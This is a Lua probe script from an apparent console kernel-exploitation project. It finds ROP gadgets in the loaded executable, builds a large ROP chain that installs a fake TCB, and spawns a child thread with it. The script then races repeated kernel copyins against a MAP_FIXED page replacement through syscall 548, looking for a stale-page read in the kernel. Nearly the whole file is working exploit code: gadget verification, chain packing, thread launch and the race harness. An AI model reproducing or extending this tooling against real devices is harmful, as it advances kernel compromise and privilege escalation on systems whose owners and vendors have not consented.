-- CRASH_CLASS: MODERATE
-- PROBE 1529b: race a kernel copyin (write from V) against 548 op-3 replacing V
--
-- Context: 1528b closed the pure vm_map-churn race (56 collisions, zero
-- corruption) -- delete/insert is serialised by the map lock. But churn has no
-- returnable oracle. This probe races something whose result comes back.
--
-- 1529a tried this with a socketpair and died twice:
--   run 2: two children shared one ROP stack, one blocked in send(), the next
--          started at the same rsp, and one ran past the last qword into
--          address 0 (RIP=0 with RAX=0x100 -- right after a successful write).
--   run 3: with four stacks, the child died INSIDE the sysarch(165,{129,fs})
--          TCB preamble (RDI=0x81, FAULT=0x10), so the TCB guard is not
--          reliable either.
-- Both fixes are here: ONE child on ONE stack (no overlap possible), and the
-- child writes to a SHM fd instead of a socket, so a write can never block and
-- an error path is never taken -- no errno/TLS is needed at all.
--
-- The child's ROP chain calls write(shmfd, V, 0x100) in a loop. The kernel does
-- copyin(user_src = V) for every call and the bytes land in the shared mapping,
-- which the main thread scans afterwards. The main thread meanwhile calls 548
-- op 3 with MAP_FIXED over V, which FREES the physical page behind V and
-- installs a fresh zeroed anon one every round.
--
-- The oracle: V is never written by us, so every byte the kernel can legitimately
-- copy is zero. A non-zero byte in the shared mapping means the kernel copied
-- from a physical page it had already returned to the free list -- i.e. a stale
-- page mapping, and the project's first kernel-originated read.
--
-- A refused store is silently swallowed (381a) and an unmapped munmap is
-- EINVAL, so nothing here depends on a store succeeding.
--
-- prior art: probes/phase36_realargs/1529a_copyin_race_op3.lua (oracle design, gadget set, the two failures)
-- prior art: probes/phase36_realargs/1528b_native_race_waves.lua (native child-ROP harness, proven)
-- prior art: probes/phase36_realargs/1528a_native_race_op3_munmap.lua (catalog gadgets verify exactly)
-- prior art: probes/phase36_realargs/1508a_sys548_map_fixed.lua (op 3 honours MAP_FIXED)
-- prior art: probes/phase23_shm/932b_shm_lifecycle.lua (shm_open 482 + ftruncate 480 + mmap 477 on 14.10)
-- prior art: probes/phase17_new_vectors/384b_child_write_minimal.lua (fake TCB, 431 exit, rsp idiom)

print("=== PROBE 1529b: copyin race vs 548 op 3 (shm destination) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function fa(v)
    if v == nil then return "nil" end
    local h, l = hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pidv = N(native.fcall_with_rax(stub, 20))
print("fn_addr=" .. fa(stub) .. " pid=" .. pidv)

local sc_mmap   = mk(477)
local sc_593    = mk(593)
local sc_thr    = mk(455)
local sc_shm    = mk(482)
local sc_ftrunc = mk(480)
local sc_548    = mk(548)

-- [A] gadgets, verified byte-exactly (a linear scan breaks at the first
-- unreadable dword and 271g missed pop rdi for four weeks because of it)
print("")
print("[A] gadget verification")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc_593(uint64(0), info) end)
local elo = rd(N(info) + 0x108)
local ehi = rd(N(info) + 0x10C)
if not elo or not ehi then print("ABORT: no eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
local sb0 = N(eboot)
print("eboot=" .. fa(eboot))

local function bytes_at(off, n)
    local out = {}
    for i = 0, n - 1 do
        local w = rd(sb0 + off + (i - (i % 4)))
        if not w then return nil end
        out[i + 1] = math.floor(w / 2 ^ ((i % 4) * 8)) % 256
    end
    return out
end
local function verifies(off, sig)
    local b = bytes_at(off, #sig)
    if not b then return false end
    for i = 1, #sig do if b[i] ~= sig[i] then return false end end
    return true
end

local off_rax, off_rdi, off_rsi, off_rdx, off_ret, off_rsp = nil, nil, nil, nil, nil, nil
if verifies(0x992,    {0x58, 0xC3}) then off_rax = 0x992 end
if verifies(0xC9DFE,  {0x5F, 0xC3}) then off_rdi = 0xC9DFE end
if verifies(0xD77D,   {0x5E, 0xC3}) then off_rsi = 0xD77D end
if verifies(0x3B02D7, {0x5A, 0xC3}) then off_rdx = 0x3B02D7 end
if verifies(0x42,     {0xC3})       then off_ret = 0x42 end
if verifies(0x9A2,    {0x5C, 0xC3}) then off_rsp = 0x9A2 end
print(string.format("  pop_rax=%s pop_rdi=%s pop_rsi=%s pop_rdx=%s ret=%s pop_rsp=%s",
    off_rax and "OK" or "NONE", off_rdi and "OK" or "NONE",
    off_rsi and "OK" or "NONE", off_rdx and "OK" or "NONE",
    off_ret and "OK" or "NONE", off_rsp and "OK" or "NONE"))
if not (off_rax and off_rdi and off_rsi and off_rdx and off_ret) then
    print("ABORT: gadget set incomplete"); return
end
local g_rax = eboot + off_rax
local g_rdi = eboot + off_rdi
local g_rsi = eboot + off_rsi
local g_rdx = eboot + off_rdx
local g_ret = eboot + off_ret

-- [B] shm destination + zeroed victim page
print("")
print("[B] shm destination + victim")
-- The child runs LAPS laps of (lseek(0) + WRITES writes) and then exits. A lap
-- rewinds, so the file never grows past one WRITES-sized window, and the chain
-- stays finite: Rev1530a2 showed a pop-rsp restart is unsafe because the C
-- syscall stub pushes onto chain qwords, so a second lap re-executes slots that
-- have already been overwritten (that is the RIP=0 death at err/trap 0x140e).
local WRITES = 2048
local LAPS   = 100
local CHUNK  = 0x100
local ITERS  = WRITES * LAPS
local SHMSZ  = math.ceil((WRITES * CHUNK) / 0x4000) * 0x4000
local okf, rfd = pcall(function() return sc_shm(uint64(1), uint64(0x202), uint64(0x180)) end)
local shmfd = okf and N(rfd) or -999
print(string.format("  shm_open(SHM_ANON=1, O_CREAT|O_RDWR) rv=%d", shmfd))
if shmfd < 0 then print("ABORT: no shm fd"); return end
local oktr, rtr = pcall(function() return sc_ftrunc(uint64(shmfd), uint64(SHMSZ)) end)
print(string.format("  ftruncate(%d, %#x) rv=%s", shmfd, SHMSZ, tostring(oktr and N(rtr) or "err")))
if not oktr or N(rtr) ~= 0 then print("ABORT: ftruncate failed"); return end
local smrv = sc_mmap(uint64(0), uint64(SHMSZ), uint64(3), uint64(1), uint64(shmfd), uint64(0))
local SM = N(smrv)
print("  shm mmap -> " .. fa(smrv))
if SM < 0x10000 then print("ABORT: no shm mapping"); return end

local VSZ = 0x10000
local vrv = sc_mmap(uint64(0), uint64(VSZ), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local V = N(vrv)
print("  victim mmap -> " .. fa(vrv))
if V < 0x10000 then print("ABORT: no victim"); return end
-- V is filled with 0x41 BEFORE its mapping is replaced. op 3 then frees that
-- physical page and installs a fresh zeroed anon page, so every copy the child
-- makes from V is legitimately zero and the ONLY way a 0x41 can appear in the
-- destination is a copyin that read the page after it was released. A zeroed V
-- (the first version of this probe) could not tell a stale read from a fresh
-- zero page -- both produce identical bytes.
pcall(function() memory.write_buffer(V, string.rep("\65", VSZ)) end)
local okt, tagged = pcall(function() return memory.read_buffer(V, 0x100) end)
local tag_ok = (okt and tagged == string.rep("A", 0x100))
print(string.format("  victim tagged 0x41 for %#x bytes: %s", 0x100, tostring(tag_ok)))
if not tag_ok then print("ABORT: the 0x41 tag is not in the victim page, the oracle is blind"); return end

-- [C] build one chain on one stack. The chain is packed into a single string
-- and written with one memory.write_buffer call: 300k individual wq() calls
-- would cost seconds.
print("")
print("[C] child chain")
-- The chain is built BEFORE the stack is mapped: `alloc` used to be computed
-- from a placeholder nq of 0, so the mapping was 0x5000 bytes and the
-- write_buffer of a 2.9 MB blob faulted the loader 0xD0 bytes in (capture
-- 1529b_copyin_race_shm_20261110_114104.txt). The fit check ran after the
-- write, so it never got the chance to abort.
local function packq(v)
    local h, l = hi_lo(v)
    return string.char(l % 256, math.floor(l / 256) % 256,
        math.floor(l / 65536) % 256, math.floor(l / 16777216) % 256,
        h % 256, math.floor(h / 256) % 256,
        math.floor(h / 65536) % 256, math.floor(h / 16777216) % 256)
end

local parts = {}
local function put(v) parts[#parts + 1] = packq(v) end

-- The child MUST install a fake TCB first. Its write can fail (a placement
-- that leaves V unmapped makes it EFAULT) and the libkernel stub's error path
-- stores errno through %fs:0; without a TCB that path faults and the child dies
-- silently while the main loop keeps counting placements (384b/1529a).
put(uint64(eboot + off_rdi)); put(uint64(129))            -- AMD64_SET_FSBASE
put(uint64(eboot + off_rsi)); put(uint64(0))              -- patched below
put(uint64(eboot + off_rax)); put(uint64(165)); put(uint64(stub))
put(g_rdi); put(uint64(shmfd))
put(g_rsi); put(uint64(0))
put(g_rdx); put(uint64(0))
put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd, 0, SEEK_SET)
put(uint64(eboot + off_rdi)); put(uint64(shmfd))
for i = 1, LAPS do
    put(g_rsi); put(uint64(0))
    put(g_rdx); put(uint64(0))
    put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd,0,SEEK_SET)
    put(g_rsi); put(uint64(V))
    put(g_rdx); put(uint64(CHUNK))
    for j = 1, WRITES do
        put(g_rax); put(uint64(4)); put(uint64(stub)) -- write(fd,V,CHUNK)
    end
end
put(g_rax); put(uint64(431)); put(uint64(stub))       -- thr_exit(0)
local nq = #parts
-- blob is assembled after the stack exists so the TCB address can be patched
-- into the preamble (parts[4]) before the chain is written
local blob = ""
-- 0x4000 for the TCB page, 0x1000 slack, and the blob above rsp = base+0x3ff8
local alloc = math.ceil((0x4000 + nq * 8 + 0x1000) / 0x4000) * 0x4000
local srv2 = sc_mmap(uint64(0), uint64(alloc), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sbase = N(srv2)
print("  stack mmap -> " .. fa(srv2) .. string.format(" alloc=%d bytes=%d", alloc, #blob))
if sbase < 0x10000 then print("ABORT: no stack mapping"); return end
if 0x4000 - 8 + #blob > alloc then
    print("ABORT: chain does not fit its stack"); return
end
local rsp = sbase + 0x4000 - 8
local chain_start = rsp
parts[4] = packq(uint64(sbase + 0x1000))
blob = table.concat(parts)
parts = nil
-- fake TCB: the syscall stub's error path stores errno through %fs:0
for i = 0, 0x1FF do wq(sbase + i * 8, uint64(sbase)) end
local fs_ptr = sbase + 0x1000
wq(fs_ptr, uint64(sbase))
local okw = pcall(function() memory.write_buffer(rsp, blob) end)
print(string.format("  chain qwords=%d bytes=%d alloc=%d stack=%s write=%s",
    nq, nq * 8, alloc, fa(uint64(sbase)), tostring(okw)))
if not okw or #blob ~= nq * 8 then print("ABORT: chain write failed"); return end
-- the child starts by ret-ing into the first qword, so verify it survived
local first = rd(rsp)
local tail = rd(rsp + #blob - 8)
local want = N(g_rdi) % 4294967296
-- the chain ends with pop_rsp; chain_start when the loop guard is present,
-- otherwise with a run of bare rets
local want_tail = N(stub) % 4294967296
if not first or first ~= want or not tail or tail ~= want_tail then
    print(string.format("  ABORT: chain damaged first=%s want=%s tail=%s want_tail=%s",
        tostring(first), tostring(want), tostring(tail), tostring(want_tail)))
    return
end
blob = nil

local pa = memory.alloc(0x40)
for i = 0, 7 do wq(N(pa) + i * 8, uint64(0)) end
local ctid = memory.alloc(8)
wd(N(ctid), 0)
wq(N(pa) + 0x00, uint64(g_ret))      -- start_func: ret into the chain
wq(N(pa) + 0x08, uint64(0))          -- arg
wq(N(pa) + 0x10, uint64(sbase))      -- stack_base
wq(N(pa) + 0x18, uint64(0x4000))     -- stack_size
wq(N(pa) + 0x30, uint64(N(ctid)))    -- child_tid

-- [D] race: op 3 MAP_FIXED over V while the child copyins from V
print("")
print("[D] race")
local ent = memory.alloc(0x40)
local done = memory.alloc(8)

local function place(va, len, prot)
    for i = 0, 3 do wq(N(ent) + i * 8, uint64(0)) end
    wq(N(ent) + 0x00, uint64(va))
    wq(N(ent) + 0x10, uint64(len))
    wd(N(ent) + 0x18, prot)
    wd(N(ent) + 0x1C, 3)
    wd(N(done), 0xEEEEEEEE)
    local ok, rv = pcall(function() return sc_548(uint64(0), uint64(0x10), uint64(N(ent)), uint64(1), uint64(N(done)), uint64(0)) end)
    return ok, (ok and N(rv) or -999), rd(N(done))
end

-- Prove SM aliases the object the child writes through: put a marker in the
-- mapping, read it back through the descriptor. Without this the scan could be
-- reading an unrelated zero page that happens to be mapped.
pcall(function() memory.write_dword(SM + 0x40, uint64(0x5A5A1234)) end)
local albuf = memory.alloc(4)
local okal = pcall(function()
    mk(478)(uint64(shmfd), uint64(0x40), uint64(0))
    return mk(3)(uint64(shmfd), uint64(N(albuf)), uint64(4))
end)
local alias_ok = okal and rd(N(albuf)) == 0x5A5A1234
print(string.format("  mapping aliases the descriptor: %s", tostring(alias_ok)))
if not alias_ok then print("ABORT: SM does not alias shmfd"); return end
pcall(function() memory.write_dword(SM + 0x40, uint64(0)) end)

-- Replace V's page ONCE before the child starts. Everything the child copies
-- from here on must be zero (fresh anon page); the 0x41 we just wrote is now
-- only reachable through a stale reference to the released page. The log
-- offset at this instant separates legitimate pre-placement copies from the
-- ones that matter.
local ok0, rv0, dn0 = place(V, 0x4000, 3)
local off_first = N(mk(478)(uint64(shmfd), uint64(0), uint64(1)))
print(string.format("  pre-placement rv=%s done=%s log offset=%d", tostring(rv0), tostring(dn0), off_first))
if not ok0 or rv0 ~= V or off_first < 0 then print("ABORT: pre-placement failed"); return end

local ok_sp, rsp_ = pcall(function() return sc_thr(uint64(N(pa)), uint64(0x38)) end)
print(string.format("  thr_new rv=%s child_tid=%s", tostring(ok_sp and N(rsp_) or "err"), tostring(rd(N(ctid)))))
if not ok_sp or N(rsp_) ~= 0 then print("ABORT: no child"); return end

-- 547 returns rv=0 with a 0x18-byte record {start_lo,start_hi,end_lo,end_hi,
-- prot@0x10,flags@0x14}; rv=-1 means no mapping covers the address.
local prec = memory.alloc(0x20)
local function prot_of(a)
    wq(N(prec), uint64(0)); wq(N(prec) + 8, uint64(0)); wq(N(prec) + 0x10, uint64(0))
    local ok, rv = pcall(function()
        return mk(547)(uint64(a), uint64(N(prec)), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    return rd(N(prec) + 0x10)
end

local ROUNDS = 500
local marks = {}
local bad_place, bad_prot, first_bad = 0, 0, ""
local last = nil
-- RevRace2 P1: the child rewrites the same window every lap, so a stale byte
-- from an early lap is erased long before the end-of-run scan. Scan the window
-- EVERY round instead, while the byte is still there.
local live_stale, first_stale = 0, ""
local function scan_window(r)
    local off = 0
    while off < SHMSZ do
        local n = 0x10000
        if off + n > SHMSZ then n = SHMSZ - off end
        local ok, d = pcall(function() return memory.read_buffer(SM + off, n) end)
        if not ok or type(d) ~= "string" then
            if first_stale == "" then first_stale = "round " .. r .. " scan failed" end
            return
        end
        local p2 = d:find("A", 1, true)
        while p2 do
            live_stale = live_stale + 1
            if first_stale == "" then
                first_stale = string.format("round %d shm offset %d", r, off + p2 - 1)
            end
            p2 = d:find("A", p2 + 1, true)
            if live_stale > 256 then return end
        end
        off = off + n
    end
end
for r = 1, ROUNDS do
    local ok, rv, dn = place(V, 0x4000, 3)
    if not ok or rv ~= V then
        bad_place = bad_place + 1
        if first_bad == "" then first_bad = string.format("round %d rv=%s done=%s", r, tostring(rv), tostring(dn)) end
    end
    -- op 3 deletes the covering entry before inserting, so a placement that
    -- failed between the two steps leaves V unmapped and a blind read would
    -- kill the loader on exactly the round that proved the design broken.
    local mapped = prot_of(V) ~= nil
    if not mapped then
        bad_prot = bad_prot + 1
        if first_bad == "" then first_bad = string.format("round %d victim unmapped", r) end
    else
        last = rd(V)
        if last ~= 0 then
            bad_prot = bad_prot + 1
            if first_bad == "" then first_bad = string.format("round %d victim word=%s", r, tostring(last)) end
        end
    end
    scan_window(r)
    if ok and dn ~= 1 then
        bad_place = bad_place + 1
        if first_bad == "" then first_bad = string.format("round %d processed=%s", r, tostring(dn)) end
    end
    if r % 100 == 0 then
        -- The child's writes must be spread across the loop, not finished
        -- before it: a child that completed all 100000 writes by round 500 of
        -- 20000 raced only the first 500 replacements. Five samples over 500
        -- rounds, and the offset must take at least three distinct values.
        local okl2, ol2 = pcall(function() return mk(478)(uint64(shmfd), uint64(0), uint64(1)) end)
        local o2 = okl2 and N(ol2) or -1
        marks[#marks + 1] = o2
        print(string.format("  round %d bad_place=%d bad_prot=%d child_offset=%s",
            r, bad_place, bad_prot, tostring(o2)))
    end
end
print(string.format("  rounds=%d bad_place=%d bad_prot=%d last_victim_word=%s", ROUNDS, bad_place, bad_prot, tostring(last)))
if first_bad ~= "" then print("  first_bad: " .. first_bad) end

-- [E] scan the shared mapping the child copied into
print("")
print("[E] scan the shm destination")
local scanned, nonzero, firstnz, fails = 0, 0, "", 0
local step = 0x8000
-- The child rewinds each lap, so every byte of the window is written; scan the
-- whole thing rather than only the bytes after the first sample.
local off = 0
while off < SHMSZ do
    local n = step
    if off + n > SHMSZ then n = SHMSZ - off end
    local okr, s = pcall(function() return memory.read_buffer(SM + off, n) end)
    if okr and type(s) == "string" and #s == n then
        scanned = scanned + n
        local p = s:find("\65")   -- 0x41: content of the page we released
        if p then
            nonzero = nonzero + 1
            if firstnz == "" then
                local lo = p - 8; if lo < 1 then lo = 1 end
                local hi = p + 8; if hi > #s then hi = #s end
                local hex = {}
                for i = lo, hi do hex[#hex + 1] = string.format("%02X", s:byte(i)) end
                firstnz = string.format("off 0x%X byte %d: %s", off + p - 1, p, table.concat(hex, " "))
            end
        end
    else
        fails = fails + 1
    end
    off = off + step
end
print(string.format("  shm size=0x%X scanned_from=%d scanned=%d chunks_with_0x41=%d read_fails=%d",
    SHMSZ, off_first, scanned, nonzero, fails))
print(string.format("  stale bytes seen DURING the loop: %d", live_stale))
if first_stale ~= "" then print("  first: " .. first_stale) end
if firstnz ~= "" then print("  first non-zero: " .. firstnz) end

-- [E2] liveness: the file offset is shared with the child, so lseek(SEEK_CUR)
-- counts exactly how many of the child's writes actually happened. Without it a
-- child that died after ten writes would produce the same "all zero" scan as a
-- child that survived a hundred thousand.
print("")
print("[E2] child liveness")
local okL, rL = pcall(function() return mk(478)(uint64(shmfd), uint64(0), uint64(1)) end)
local off = okL and N(rL) or -1
print(string.format("  shared offset = %d, first sample was %d, growth=%d",
    off, off_first, off - off_first))
-- The child rewinds the file every lap, so the offset is not monotonic, but it
-- still moves while the child writes: a dead child leaves the offset frozen at
-- whatever value the last completed write left. Four samples spread over the
-- loop must therefore show at least three different positions.
local distinct = {}
for i = 1, #marks do distinct[marks[i]] = true end
local ndistinct = 0
for _ in pairs(distinct) do ndistinct = ndistinct + 1 end
-- a child that died after the third mark would still give 3 distinct values,
-- so the last two samples must also differ from each other
local still_moving = #marks >= 2 and marks[#marks] ~= marks[#marks - 1]
local full_run = ndistinct >= 3 and still_moving
print(string.format("  per-round offsets: %s (wraps each lap), distinct=%d",
    table.concat(marks, " "), ndistinct))

-- [F] verdict
print("")
print("[F] verdict")
if not full_run then
    print(string.format("  VERDICT PARTIAL: the offset took only %d distinct values across",
        ndistinct))
    print("  the loop, so the child was not writing for most of it")
elseif scanned == 0 then
    print("  VERDICT VOID: nothing could be read back")
elseif nonzero > 0 then
    print("  *** 0x41 IN THE COPY DESTINATION AFTER THE PAGE WAS RELEASED ***")
    print("  the kernel copied from the page it had already freed -- stale mapping")
else
    print(string.format("  clean: %d bytes copied after V's page was replaced, none of", scanned))
    print("  them carrying the 0x41 that page held before it was released")
end
print("  final pid=" .. tostring(N(native.fcall_with_rax(stub, 20))) .. " expected " .. tostring(pidv))
print("")
print("=== PROBE 1529b COMPLETE ===")
